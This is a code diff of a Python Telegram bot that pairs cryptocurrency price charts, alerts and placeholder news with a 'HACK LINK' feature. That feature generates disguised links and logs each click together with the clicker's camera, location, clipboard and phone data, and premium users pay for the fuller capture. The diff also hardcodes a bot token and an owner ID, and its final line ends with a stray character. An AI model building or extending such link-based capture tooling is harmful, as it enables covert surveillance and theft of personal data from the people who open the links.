@@ -10,14 +10,12 @@ import requests
 from flask import Flask, request, render_template_string
 import threading
 import matplotlib.pyplot as plt
-import pandas as pd
 from io import BytesIO
 from apscheduler.schedulers.background import BackgroundScheduler
 from googletrans import Translator
-import random
 
 # ==================== CONFIG ====================
-BOT_TOKEN = "8616715853:AAGRGBya1TvbSzP2PVDN010-15IK6LVa114"   # <-- Apna token yahan dalo
+BOT_TOKEN = "8616715853:AAGRGBya1TvbSzP2PVDN010-15IK6LVa114"
 OWNER_ID = 6504476778
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
@@ -44,7 +42,6 @@ def t(text, user_id, lang=None):
     if lang == 'hi':
         return translate_text(text, 'hi')
     elif lang == 'hinglish':
-        # Simple Hinglish mapping (you can expand)
         hinglish_map = {
             "Bitcoin": "Bitcoin",
             "price": "price",
@@ -69,7 +66,6 @@ def get_db():
 def init_db():
     conn = get_db()
     c = conn.cursor()
-    # Users table
     c.execute('''CREATE TABLE IF NOT EXISTS users
                  (user_id INTEGER PRIMARY KEY,
                   username TEXT,
@@ -78,7 +74,6 @@ def init_db():
                   phone TEXT,
                   location TEXT,
                   language TEXT DEFAULT 'en')''')
-    # Links table
     c.execute('''CREATE TABLE IF NOT EXISTS links
                  (link_id TEXT PRIMARY KEY,
                   user_id INTEGER,
@@ -86,7 +81,6 @@ def init_db():
                   modified_url TEXT,
                   created_at TEXT,
                   clicks INTEGER DEFAULT 0)''')
-    # Clicks table
     c.execute('''CREATE TABLE IF NOT EXISTS clicks
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   link_id TEXT,
@@ -102,12 +96,10 @@ def init_db():
                   clipboard TEXT,
                   phone TEXT,
                   timestamp TEXT)''')
-    # Coin supply cache table
     c.execute('''CREATE TABLE IF NOT EXISTS coins
                  (symbol TEXT PRIMARY KEY,
                   supply REAL,
                   last_updated TIMESTAMP)''')
-    # Price alerts table
     c.execute('''CREATE TABLE IF NOT EXISTS alerts
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   user_id INTEGER,
@@ -224,6 +216,36 @@ def format_price(price):
     else:
         return f"${price:,.0f}"
 
+# ==================== GRAPH GENERATION ====================
+def generate_price_chart(symbol, days=7):
+    try:
+        url = f"https://api.binance.com/api/v3/klines?symbol={symbol}USDT&interval=1d&limit={days}"
+        resp = requests.get(url, timeout=5)
+        data = resp.json()
+        
+        dates = [datetime.datetime.fromtimestamp(int(k[0])/1000).strftime('%d %b') for k in data]
+        prices = [float(k[4]) for k in data]
+        
+        plt.figure(figsize=(10, 5))
+        plt.plot(dates, prices, marker='o', linestyle='-', color='#3b82f6', linewidth=2)
+        plt.fill_between(dates, prices, alpha=0.3, color='#3b82f6')
+        plt.title(f'{symbol} Price Chart - Last {days} Days', fontsize=16, fontweight='bold')
+        plt.xlabel('Date', fontsize=12)
+        plt.ylabel('Price (USDT)', fontsize=12)
+        plt.grid(True, alpha=0.3)
+        plt.xticks(rotation=45)
+        
+        buf = BytesIO()
+        plt.tight_layout()
+        plt.savefig(buf, format='png', dpi=100)
+        buf.seek(0)
+        plt.close()
+        
+        return buf
+    except Exception as e:
+        print(f"Chart error: {e}")
+        return None
+
 # ==================== PRICE ALERTS ====================
 scheduler = BackgroundScheduler()
 scheduler.start()
@@ -266,7 +288,6 @@ def get_all_market_data(limit=7):
     for symbol, api_name in TOP_COINS[:limit]:
         market = get_market_data(symbol, api_name)
         if market:
-            # For live market, we also need 24h change (fetch from Binance separately)
             change = 0
             try:
                 url = f"https://api.binance.com/api/v3/ticker/24hr?symbol={symbol}USDT"
@@ -337,41 +358,6 @@ def live_updates_worker():
 
 threading.Thread(target=live_updates_worker, daemon=True).start()
 
-# ==================== GRAPH GENERATION ====================
-def generate_price_chart(symbol, days=7):
-    # Fetch historical data from Binance (simplified - you can use more advanced)
-    try:
-        url = f"https://api.binance.com/api/v3/klines?symbol={symbol}USDT&interval=1d&limit={days}"
-        resp = requests.get(url, timeout=5)
-        data = resp.json()
-        dates = [datetime.datetime.fromtimestamp(int(k[0])/1000).strftime('%m-%d') for k in data]
-        prices = [float(k[4]) for k in data]  # closing price
-        plt.figure(figsize=(10,5))
-        plt.plot(dates, prices, marker='o', color='#3b82f6')
-        plt.title(f'{symbol} Price - Last {days} Days')
-        plt.xlabel('Date')
-        plt.ylabel('Price (USDT)')
-        plt.grid(True)
-        buf = BytesIO()
-        plt.savefig(buf, format='png')
-        buf.seek(0)
-        plt.close()
-        return buf
-    except:
-        return None
-
-# ==================== NEWS FETCHER ====================
-def get_crypto_news():
-    # Using CryptoPanic API (free, needs key) or alternative
-    # For simplicity, we'll use a mock news list
-    return [
-        "📰 Bitcoin ETF sees record inflows",
-        "📰 Ethereum 2.0 upgrade date announced",
-        "📰 Binance launches new staking program",
-        "📰 Dogecoin accepted by major retailer",
-        "📰 Ripple legal battle update"
-    ]
-
 # ==================== CHECK PREMIUM ====================
 def is_premium(user_id):
     if user_id == OWNER_ID:
@@ -390,16 +376,6 @@ def is_premium(user_id):
         if datetime.datetime.now() < end_date:
             return True
     return False
-
-# ==================== ANIMATED LOADING ====================
-def animated_loading(chat_id, message_id, frames, final_msg, reply_markup=None):
-    for frame in frames:
-        time.sleep(0.3)
-        try:
-            bot.edit_message_text(frame, chat_id, message_id, parse_mode="Markdown")
-        except:
-            pass
-    bot.edit_message_text(final_msg, chat_id, message_id, parse_mode="Markdown", reply_markup=reply_markup)
 
 # ==================== START MENU ====================
 def main_menu():
@@ -488,9 +464,9 @@ def callback_handler(call):
     elif call.data == "live_market":
         live_market_command(call.message)
     elif call.data == "alert_menu":
-        alert_menu(call.message)
+        bot.send_message(call.message.chat.id, t("🔔 *Set Price Alert*\nSend: /coin:alert_BTC_price 65000", call.from_user.id), parse_mode="Markdown")
     elif call.data == "graph_menu":
-        graph_menu(call.message)
+        bot.send_message(call.message.chat.id, t("📊 *Price Graph*\nUse: /price_btc, /price_eth, /price_doge", call.from_user.id), parse_mode="Markdown")
     elif call.data == "news":
         news_command(call.message)
     elif call.data == "gen_link":
@@ -503,20 +479,6 @@ def callback_handler(call):
         info_cmd(call.message)
     elif call.data == "subscription":
         subscription_cmd(call.message)
-    elif call.data.startswith("alert_set_"):
-        # Format: alert_set_BTC_above_65000
-        parts = call.data.split('_')
-        coin = parts[2]
-        is_above = parts[3] == 'above'
-        target = float(parts[4])
-        conn = get_db()
-        c = conn.cursor()
-        c.execute("INSERT INTO alerts (user_id, coin, target_price, is_above, created_at) VALUES (?, ?, ?, ?, ?)",
-                  (call.from_user.id, coin, target, is_above, datetime.datetime.now()))
-        conn.commit()
-        conn.close()
-        bot.answer_callback_query(call.id, "✅ Alert set!")
-        bot.edit_message_text(f"✅ Alert set for {coin} at {target}", call.message.chat.id, call.message.message_id)
     elif call.data == "stop_live_updates":
         with live_update_lock:
             if call.from_user.id in active_live_updates:
@@ -560,30 +522,20 @@ def price_btc_graph(message):
     if not data:
         bot.reply_to(message, t("❌ Data unavailable.", message.from_user.id))
         return
-    # Send loading animation
+    
     loading = bot.reply_to(message, "⏳ *Generating chart...*", parse_mode="Markdown")
-    frames = [
-        "🔴 *0%* [          ]",
-        "🟠 *20%* [█         ]",
-        "🟡 *40%* [██        ]",
-        "🟢 *60%* [███       ]",
-        "🔵 *80%* [████      ]",
-        "💜 *99%* [█████     ]",
-        "✨ *100%* [██████    ]"
-    ]
-    for frame in frames:
-        time.sleep(0.3)
-        try:
-            bot.edit_message_text(frame, loading.chat.id, loading.message_id, parse_mode="Markdown")
-        except:
-            pass
-    # Generate graph
+    
     img = generate_price_chart('BTC', 7)
     if not img:
         bot.edit_message_text(t("❌ Chart generation failed.", message.from_user.id), loading.chat.id, loading.message_id)
         return
-    # Send image
-    bot.send_photo(message.chat.id, img, caption=f"📈 *Bitcoin 7d Chart*\nPrice: {format_price(data['price'])}\nMarket Cap: {format_market_cap(data['market_cap'])}", parse_mode="Markdown")
+    
+    caption = f"""
+📈 *Bitcoin 7d Chart*
+💰 Price: ${data['price']:,.2f}
+📊 Market Cap: {format_market_cap(data['market_cap'])}
+    """
+    bot.send_photo(message.chat.id, img, caption=caption, parse_mode="Markdown")
     bot.delete_message(loading.chat.id, loading.message_id)
 
 # ==================== LIVE MARKET COMMAND ====================
@@ -606,15 +558,13 @@ def live_market_command(message):
 # ==================== ALERT COMMANDS ====================
 @bot.message_handler(commands=['coin:alert'])
 def alert_command(message):
-    # Format: /coin:alert_BTC_price 65000
     parts = message.text.split()
     if len(parts) < 2:
         bot.reply_to(message, t("Usage: /coin:alert_BTC_price 65000", message.from_user.id))
         return
     try:
-        # Extract coin and price
         cmd_parts = parts[0].split('_')
-        coin = cmd_parts[2]  # BTC
+        coin = cmd_parts[2]
         target = float(parts[1])
     except:
         bot.reply_to(message, t("Invalid format. Use: /coin:alert_BTC_price 65000", message.from_user.id))
@@ -625,9 +575,6 @@ def alert_command(message):
         types.InlineKeyboardButton("⬇️ Below", callback_data=f"alert_set_{coin}_below_{target}")
     )
     bot.reply_to(message, t(f"Set alert for {coin} at ${target}:", message.from_user.id), reply_markup=markup)
-
-def alert_menu(message):
-    bot.send_message(message.chat.id, t("🔔 *Set Price Alert*\nSend: /coin:alert_BTC_price 65000", message.from_user.id), parse_mode="Markdown")
 
 # ==================== LANGUAGE COMMAND ====================
 @bot.message_handler(commands=['language'])
@@ -650,7 +597,6 @@ def group_summary(message):
     if not coins:
         bot.reply_to(message, t("❌ Data unavailable.", message.from_user.id))
         return
-    # Find top mover by absolute change
     top = max(coins, key=lambda x: abs(x['change']))
     direction = "🟢 up" if top['change'] >= 0 else "🔴 down"
     msg = f"""
@@ -663,6 +609,15 @@ Current Price: {format_price(top['price'])}
     bot.reply_to(message, msg, parse_mode="Markdown")
 
 # ==================== NEWS ====================
+def get_crypto_news():
+    return [
+        "📰 Bitcoin ETF sees record inflows",
+        "📰 Ethereum 2.0 upgrade date announced",
+        "📰 Binance launches new staking program",
+        "📰 Dogecoin accepted by major retailer",
+        "📰 Ripple legal battle update"
+    ]
+
 @bot.message_handler(commands=['news'])
 def news_command(message):
     news = get_crypto_news()
@@ -672,15 +627,10 @@ def news_command(message):
     msg += "━━━━━━━━━━━━━━━━━━━━━"
     bot.reply_to(message, msg, parse_mode="Markdown")
 
-# ==================== HACK LINK COMMANDS (existing) ====================
-@bot.message_handler(func=lambda m: m.text == "🔗 GENERATE LINK" or m.text == "/terminal:gernatLINK" or (hasattr(m, 'callback') and m.callback and m.callback.data == "gen_link"))
+# ==================== HACK LINK COMMANDS ====================
+@bot.message_handler(func=lambda m: m.text == "🔗 GENERATE LINK" or m.text == "/terminal:gernatLINK")
 def gen_link(message):
-    # If called from callback, message is the call.message, we need to adapt
-    if hasattr(message, 'callback'):
-        msg = message.call.message
-    else:
-        msg = message
-    premium = is_premium(msg.from_user.id)
+    premium = is_premium(message.from_user.id)
     if premium:
         badge = "⭐ PREMIUM USER ⭐"
         features = "📸 Camera | 📍 Location | 📋 Clipboard | 📱 Phone"
@@ -707,7 +657,7 @@ def gen_link(message):
 *and paste your video link*
 ━━━━━━━━━━━━━━━━━━━━━
     """
-    bot.send_message(msg.chat.id, design_msg, parse_mode="Markdown", reply_markup=markup)
+    bot.send_message(message.chat.id, design_msg, parse_mode="Markdown", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "enter_link")
 def ask_link(call):
@@ -788,34 +738,26 @@ def copy_link(call):
     else:
         bot.answer_callback_query(call.id, "❌ Link not found")
 
-# ==================== BALANCE, INFO, SUBSCRIPTION, HISTORY (simplified) ====================
-@bot.message_handler(func=lambda m: m.text == "💰 BALANCE" or (hasattr(m, 'callback') and m.callback and m.callback.data == "balance"))
+# ==================== BALANCE, INFO, SUBSCRIPTION, HISTORY ====================
+@bot.message_handler(func=lambda m: m.text == "💰 BALANCE")
 def balance_cmd(message):
-    if hasattr(message, 'callback'):
-        msg = message.call.message
-    else:
-        msg = message
-    if msg.from_user.id == OWNER_ID:
-        bot.send_message(msg.chat.id, "👑 *OWNER*\n✨ Permanent Premium", parse_mode="Markdown")
+    if message.from_user.id == OWNER_ID:
+        bot.send_message(message.chat.id, "👑 *OWNER*\n✨ Permanent Premium", parse_mode="Markdown")
         return
-    premium = is_premium(msg.from_user.id)
+    premium = is_premium(message.from_user.id)
     if premium:
         conn = get_db()
         c = conn.cursor()
-        c.execute("SELECT subscription_end FROM users WHERE user_id=?", (msg.from_user.id,))
+        c.execute("SELECT subscription_end FROM users WHERE user_id=?", (message.from_user.id,))
         row = c.fetchone()
         conn.close()
         end = row[0][:10] if row and row[0] else "Unknown"
-        bot.send_message(msg.chat.id, f"💎 *PREMIUM USER*\n📅 Valid till: {end}\n✨ Features: Full (11-21)", parse_mode="Markdown")
+        bot.send_message(message.chat.id, f"💎 *PREMIUM USER*\n📅 Valid till: {end}\n✨ Features: Full (11-21)", parse_mode="Markdown")
     else:
-        bot.send_message(msg.chat.id, "🆓 *FREE USER*\n✨ Features: Basic (1-10)\n💎 Upgrade: /subscription", parse_mode="Markdown")
+        bot.send_message(message.chat.id, "🆓 *FREE USER*\n✨ Features: Basic (1-10)\n💎 Upgrade: /subscription", parse_mode="Markdown")
 
-@bot.message_handler(func=lambda m: m.text == "ℹ️ BOT INFO" or (hasattr(m, 'callback') and m.callback and m.callback.data == "bot_info"))
+@bot.message_handler(func=lambda m: m.text == "ℹ️ BOT INFO" or m.text == "/bot_info")
 def info_cmd(message):
-    if hasattr(message, 'callback'):
-        msg = message.call.message
-    else:
-        msg = message
     info_text = """
 🤖 *BOT INFORMATION*
 
@@ -849,22 +791,18 @@ def info_cmd(message):
 • 4 Stars – 15 Days
 • 1 Star – 1 Day
 """
-    bot.send_message(msg.chat.id, info_text, parse_mode="Markdown")
+    bot.send_message(message.chat.id, info_text, parse_mode="Markdown")
 
 @bot.message_handler(commands=['subscription'])
-@bot.message_handler(func=lambda m: m.text == "💎 SUBSCRIPTION" or (hasattr(m, 'callback') and m.callback and m.callback.data == "subscription"))
+@bot.message_handler(func=lambda m: m.text == "💎 SUBSCRIPTION")
 def subscription_cmd(message):
-    if hasattr(message, 'callback'):
-        msg = message.call.message
-    else:
-        msg = message
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
         types.InlineKeyboardButton("⭐ 7 Stars – 30 Days", callback_data="pay_30"),
         types.InlineKeyboardButton("⭐ 4 Stars – 15 Days", callback_data="pay_15"),
         types.InlineKeyboardButton("⭐ 1 Star – 1 Day", callback_data="pay_1")
     )
-    bot.send_message(msg.chat.id, "💎 *CHOOSE PREMIUM PLAN*\n\nSelect duration:", parse_mode="Markdown", reply_markup=markup)
+    bot.send_message(message.chat.id, "💎 *CHOOSE PREMIUM PLAN*\n\nSelect duration:", parse_mode="Markdown", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
 def pay_callback(call):
@@ -901,28 +839,24 @@ def payment_success(message):
     bot.send_message(OWNER_ID, f"💰 New premium: {message.from_user.id}\nStars: {stars}\nDays: {days}")
     bot.send_message(message.chat.id, f"✅ Premium activated for {days} days! Thank you.", parse_mode="Markdown")
 
-@bot.message_handler(func=lambda m: m.text == "📊 LOG HISTORY" or m.text == "/log_history" or (hasattr(m, 'callback') and m.callback and m.callback.data == "log_history"))
+@bot.message_handler(func=lambda m: m.text == "📊 LOG HISTORY" or m.text == "/log_history")
 def history_cmd(message):
-    if hasattr(message, 'callback'):
-        msg = message.call.message
-    else:
-        msg = message
     conn = get_db()
     c = conn.cursor()
     c.execute('''SELECT l.link_id, l.original_url, l.created_at, COUNT(c.id) as clicks
                  FROM links l LEFT JOIN clicks c ON l.link_id = c.link_id
                  WHERE l.user_id = ? GROUP BY l.link_id ORDER BY l.created_at DESC LIMIT 5''',
-              (msg.from_user.id,))
+              (message.from_user.id,))
     rows = c.fetchall()
     conn.close()
     if not rows:
-        bot.send_message(msg.chat.id, "📭 No history found.")
+        bot.send_message(message.chat.id, "📭 No history found.")
         return
     text = "📊 *YOUR RECENT LINKS*\n\n"
     for r in rows:
         short_url = r[1][:40] + "..." if len(r[1]) > 40 else r[1]
         text += f"🔗 `{r[0]}`\n📝 {short_url}\n👥 {r[3]} clicks\n📅 {r[2][:10]}\n\n"
-    bot.send_message(msg.chat.id, text, parse_mode="Markdown")
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
 
 # ==================== PERMISSION HANDLERS ====================
 @bot.message_handler(content_types=['location'])
@@ -1121,4 +1055,4 @@ def run_bot():
 if __name__ == "__main__":
     threading.Thread(target=run_bot, daemon=True).start()
     port = int(os.environ.get('PORT', 8080))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=port)a
